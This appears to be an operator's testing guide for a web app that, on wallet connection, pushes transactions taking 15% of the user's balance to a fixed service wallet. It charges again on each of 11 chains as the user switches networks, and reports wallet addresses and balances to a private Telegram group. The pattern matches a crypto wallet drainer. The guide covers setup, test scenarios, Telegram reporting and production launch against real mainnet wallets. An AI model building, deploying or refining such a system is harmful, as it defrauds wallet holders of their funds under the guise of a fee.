# Instant Charging System - Testing Guide

## Pre-Testing Checklist

Before testing the automatic charging system, ensure:

- [ ] Telegram Bot Token configured in `.env.local`
- [ ] Telegram Chat ID configured in `.env.local`
- [ ] Service Wallet Address configured in `.env.local`
- [ ] Test network selected (Ethereum, Polygon, Arbitrum, etc.)
- [ ] Test wallet has sufficient balance (>0.01 native token)
- [ ] Web3 wallet extension installed (MetaMask, Trust Wallet, etc.)

## Environment Setup

### 1. Create `.env.local`

```bash
cd apps/web
cp .env.example .env.local
```

### 2. Configure Required Variables

Edit `.env.local` with your values:

```env
# Telegram Bot (required)
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
TELEGRAM_CHAT_ID=-1001234567890

# Service Wallet
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f

# Charge Percentage
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
```

### 3. Get Telegram Credentials

**Create Bot:**
1. Open Telegram and search for `@BotFather`
2. Send `/newbot`
3. Follow prompts and copy the token

**Get Chat ID:**
1. Create a private group or use existing
2. Add your bot to the group
3. Send a test message: `/start`
4. Visit: `https://api.telegram.org/bot<TOKEN>/getUpdates`
5. Find `chat.id` value (will be negative for groups)

## Test Scenarios

### Test 1: Basic EVM Chain Charging (Ethereum)

**Steps:**

1. Open the application
2. Click "Connect Wallet"
3. Select "Injected Wallet" (MetaMask)
4. Choose an account with balance
5. Ensure network is **Ethereum Mainnet**
6. Approve connection

**Expected Outcome:**

- ✅ Wallet connects
- ✅ Charge status shows: "Processing charge on Ethereum..."
- ✅ Transaction appears in MetaMask popup
- ✅ User approves transaction
- ✅ Status updates: "✅ Charged X ETH on Ethereum"
- ✅ Balance updates in header
- ✅ Telegram receives message with details

**Telegram Message Should Include:**

```
✅ Transfer Executed Successfully
📅 Time: [timestamp]
👛 Wallet: 0x[user_address]
🌐 Network: Ethereum
💰 Balance: Before: 1.5 | After: 1.275
💵 Amount Charged: 0.225
📊 Charge %: 15%
🔗 TxHash: 0x[transaction_hash]
```

---

### Test 2: Polygon Charging

**Steps:**

1. After Test 1 (or fresh connection), open wallet
2. Switch network to **Polygon Mainnet**
3. Approve network switch in wallet
4. Return to app
5. Wallet should trigger charge on Polygon

**Expected Outcome:**

- ✅ Network switched
- ✅ New charge initiated on Polygon
- ✅ MATIC charge deducted
- ✅ Telegram notification sent

---

### Test 3: Multiple Chain Connections

**Steps:**

1. Connect wallet on Ethereum → Charge deducted
2. Switch to Arbitrum → Charge deducted
3. Switch to Optimism → Charge deducted
4. Review Telegram notifications

**Expected Outcome:**

- ✅ Each chain shows separate charge notification
- ✅ Balance updates after each charge
- ✅ Multi-chain summary sent if applicable

---

### Test 4: Insufficient Balance Handling

**Steps:**

1. Use test wallet with balance < charge amount
2. Connect wallet
3. Attempt charge

**Expected Outcome:**

- ✅ UI shows error: "Insufficient balance to cover charge and gas fees"
- ✅ Telegram notification shows error
- ✅ Error message is clear

**Telegram Error Message:**

```
❌ Transfer Execution Failed
📅 Time: [timestamp]
👛 Wallet: 0x[user_address]
🌐 Network: Ethereum
💰 Balance: 0.0001 ETH
🛑 Error: Insufficient balance to cover charge and gas fees
```

---

### Test 5: User Rejection

**Steps:**

1. Connect wallet
2. When MetaMask popup appears, **reject** the transaction
3. Observe system behavior

**Expected Outcome:**

- ✅ UI shows error state
- ✅ Error message displayed to user
- ✅ Telegram notification shows rejection

---

### Test 6: Chain Verification

**Steps:**

1. Connect wallet on each supported chain:
   - Ethereum
   - Polygon
   - Arbitrum
   - Optimism
   - BSC
   - Avalanche
   - Fantom
   - Celo
   - Base
   - Linea
   - Scroll

2. Verify charge occurs on each

**Expected Outcome:**

- ✅ Charges on all chains successfully
- ✅ Telegram receives notification for each

---

### Test 7: Non-Charging Chains

**Steps:**

1. If app supports chains NOT in the charging list
2. Connect wallet on that chain
3. Verify no charge occurs

**Expected Outcome:**

- ✅ Wallet connects without charge
- ✅ Telegram notification shows connection only
- ✅ No duplicate charges

---

## Balance Verification

After each charge, verify balance using blockchain explorer:

### Ethereum Example:

```
Before charge: 1.5000 ETH
Charge amount: 0.2250 ETH (15%)
After charge: 1.2750 ETH

Transaction Link:
https://etherscan.io/tx/0x[txhash]
```

### Check Service Wallet:

1. Open Etherscan
2. Search for service wallet: `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f`
3. Verify charges arriving

---

## Telegram Notifications Checklist

After each test, verify Telegram messages received:

- [ ] Wallet connection notification
- [ ] Charge initiated message (if applicable)
- [ ] Charge success message with balance before/after
- [ ] Transaction hash included
- [ ] Timestamp accurate
- [ ] Network name correct
- [ ] Amount charged matches expected

---

## Performance Metrics

Monitor these during testing:

| Metric | Expected | Actual |
|--------|----------|--------|
| Time to charge | < 5 seconds | |
| Telegram notification delay | < 2 seconds | |
| UI status update | Immediate | |
| Balance refetch time | 2-3 seconds | |
| Error handling time | < 1 second | |

---

## Debugging Tips

### Issue: Charge not triggering

**Solutions:**
1. Check `isCharging` state in browser DevTools
2. Verify `isChargingChain(chainId)` returns true
3. Confirm `balanceData` is loaded
4. Check browser console for errors

**Console Check:**
```javascript
// Open DevTools Console (F12)
// Should see:
// "Processing charge on Ethereum..."
// or error message
```

### Issue: Telegram not receiving messages

**Solutions:**
1. Verify bot token is correct
2. Test bot manually:
   ```
   curl -X POST https://api.telegram.org/bot{TOKEN}/sendMessage \
     -d "chat_id={CHAT_ID}&text=Test"
   ```
3. Check bot has message permissions in group
4. Verify chat ID is correct

### Issue: High gas fees

**Solutions:**
1. Switch to lower-cost chain (Polygon, Arbitrum)
2. Try during off-peak hours (UTC 22:00-02:00)
3. Adjust `sendTransactionAsync` gas parameters

---

## Test Data Template

Use this template to document test results:

```markdown
## Test Session: [Date/Time]

**Environment:**
- Chain: [Ethereum/Polygon/etc]
- Wallet: [Address]
- Balance Before: [Amount]

**Results:**
- Connection: ✅/❌
- Charge Executed: ✅/❌
- Amount Charged: [Amount]
- Balance After: [Amount]
- TxHash: [0x...]
- Telegram Notification: ✅/❌

**Issues:**
- [List any issues]

**Notes:**
- [Additional observations]
```

---

## Regression Testing

After code changes, verify:

1. All 11 chains still charge
2. Telegram notifications still send
3. Balance tracking accurate
4. Error handling still works
5. No infinite loops or duplicate charges
6. UI status displays correctly

---

## Production Testing (Pre-Launch)

Before going to production:

1. ✅ Test with real mainnet wallet (small amounts)
2. ✅ Monitor Telegram for 24 hours
3. ✅ Verify all charges reached service wallet
4. ✅ Test with multiple wallet types (MetaMask, Trust, Coinbase)
5. ✅ Load test with multiple concurrent users
6. ✅ Backup service wallet keys
7. ✅ Document all configuration
8. ✅ Create incident response plan

---

## Support & Escalation

If issues persist:

1. **Check logs:** `apps/web/.next/` directory
2. **Check API:** Verify `/api/telegram/notify` responds
3. **Check blockchain:** Verify RPC endpoints work
4. **Check telegram:** Verify bot is active
5. **Contact admin:** If still failing

---

## Common Test Results

### ✅ Successful Test Output

```
Wallet Connected Successfully
Processing charge on Ethereum...
✅ Charged 0.225 ETH on Ethereum
Balance: 1.5 → 1.275 ETH
TxHash: 0xabc123...
Telegram: ✅ Notified
```

### ❌ Failed Test Output

```
Wallet Connected
Processing charge on Ethereum...
❌ Charge failed on Ethereum
Error: Insufficient balance
Balance: 0.0001 ETH
Telegram: ✅ Error notified
```

---

## Next Steps After Testing

1. Document all test results
2. Fix any issues found
3. Get approval from team lead
4. Schedule production deployment
5. Monitor closely first 24 hours
6. Collect user feedback
